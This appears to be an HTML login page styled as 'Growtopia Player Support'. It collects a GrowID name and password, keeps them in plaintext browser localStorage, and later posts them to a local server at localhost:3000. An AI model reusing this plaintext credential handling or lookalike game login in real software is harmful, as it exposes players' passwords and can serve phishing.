<!DOCTYPE html>
<html lang="en" style="background-color: rgba(0, 0, 0, 0); width: 100%; height: 100%">
    <head>
        <meta charset="utf-8" />
        <title>Growtopia Player Support</title>
        <script>
            document.addEventListener("DOMContentLoaded", function () {
                const session = JSON.parse(localStorage.getItem("growtopiaSession"));

                // Jika ada sesi yang disimpan
                if (session) {
                    const container = document.getElementById("session-container");
                    container.innerHTML = `
                        <div class="form-group text-center">
                            <button
                                class="btn btn-lg btn-primary grow-button"
                                id="last-session"
                            >
                                Connect to your last session
                            </button>
                        </div>
                    `;

                    // Ketika tombol "Connect to your last session" diklik
                    document.getElementById("last-session").onclick = function () {
                        fetch("http://localhost:3000/connect-session", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                            },
                            body: JSON.stringify(session),
                        })
                            .then((response) => response.json())
                            .then((data) => {
                                if (data.success) {
                                    alert("Connected to your last session!");
                                } else {
                                    alert("Failed to connect to your last session.");
                                }
                            });
                    };
                }
            });

            function saveSession(event) {
                event.preventDefault();
                const growId = document.getElementById("login-name").value;
                const password = document.getElementById("password").value;

                if (growId && password) {
                    // Simpan sesi di localStorage
                    localStorage.setItem(
                        "growtopiaSession",
                        JSON.stringify({ growId, password })
                    );
                    alert("Session saved!");
                }
            }
        </script>
    </head>
    <body style="background-color: rgba(0, 0, 0, 0)">
        <div class="content">
            <section class="common-box">
                <div class="container">
                    <div id="session-container"></div>
                    <form
                        method="POST"
                        action="#"
                        accept-charset="UTF-8"
                        autocomplete="off"
                        onsubmit="saveSession(event)"
                    >
                        <div class="form-group">
                            <input
                                id="login-name"
                                class="form-control grow-text"
                                placeholder="Your GrowID Name *"
                                name="growId"
                                type="text"
                            />
                        </div>
                        <div class="form-group">
                            <input
                                id="password"
                                class="form-control grow-text"
                                placeholder="Your GrowID Password *"
                                name="password"
                                type="password"
                            />
                        </div>
                        <div class="form-group text-center">
                            <input
                                class="btn btn-lg btn-primary grow-button"
                                type="submit"
                                value="Log in"
                            />
                        </div>
                    </form>
                </div>
            </section>
        </div>
    </body>
</html>
